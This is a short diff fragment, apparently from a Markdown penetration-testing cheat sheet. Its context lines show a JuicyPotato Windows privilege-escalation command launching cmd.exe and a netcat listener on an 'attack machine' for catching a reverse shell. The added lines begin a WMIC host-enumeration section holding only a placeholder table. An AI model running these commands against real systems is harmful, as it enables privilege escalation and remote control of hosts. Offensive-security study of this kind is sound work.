@@ -28,3 +28,10 @@ PS> .\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\users\pu
 <b># attack machine</b>
 $ nc -nvlp 5555
 </pre>
+## Host enumeration
+### Host enumeration with WMIC
+|a|b|c
++-+-+-+
+|aaa|bbb|ccc|
+|111|222|333|
+### Host enumeration with 
